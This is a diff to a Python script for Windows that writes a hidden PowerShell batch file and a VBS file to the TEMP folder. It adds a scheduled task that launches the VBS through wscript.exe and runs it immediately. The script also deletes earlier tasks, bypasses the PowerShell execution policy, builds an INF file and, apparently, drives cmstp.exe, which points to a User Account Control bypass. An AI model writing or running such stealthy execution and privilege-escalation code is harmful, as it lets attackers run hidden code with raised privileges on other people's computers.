@@ -43,12 +43,11 @@ def create_inf_file():
 
 def create_zzz_bat():
     temp_folder = os.getenv('TEMP')
-    vbs_content2 = f'''powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1" '''
+    vbs_content2 = f'''powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1'''
     vbs_path2 = os.path.join(temp_folder, "zzz.bat")
     with open(vbs_path2, 'w') as f:
         f.write(vbs_content2)
     return vbs_path2
-
 
 def create_zzz_vbs():
     temp_folder = os.getenv('TEMP')
@@ -117,6 +116,7 @@ Set-WindowActive cmstp
 def main():
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
+    run_command('schtasks /delete /tn "RunVBSscript" /f')
 
     returncode, stdout, stderr = run_command("python --version")
     if returncode != 0:
@@ -143,14 +143,16 @@ def main():
     zzz_vbs_path = create_zzz_vbs()
     zzz_bat_path = create_zzz_bat()
 
-    # if os.path.exists(a_ps1_path):
-    #     returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
-    #     if returncode != 0:
-    #         print(f"Failed to create task 'RunPowerShellScript': {stderr}")
-    #         sys.exit(1)
-    #     run_command('schtasks /run /tn "RunPowerShellScript"')
-    # else:
-    #     print("PowerShell script file does not exist.")
+    if os.path.exists(zzz_vbs_path):
+        returncode, stdout, stderr = run_command(
+            f'schtasks /create /tn "RunVBSscript" /tr "wscript.exe \\"{zzz_vbs_path}\\"" /sc once /st 00:00 /f'
+        )
+        if returncode != 0:
+            print(f"Failed to create task 'RunVBSscript': {stderr}")
+            sys.exit(1)
+        run_command('schtasks /run /tn "RunVBSscript"')
+    else:
+        print("zzz.vbs script file does not exist.")
 
     create_inf_file()
 
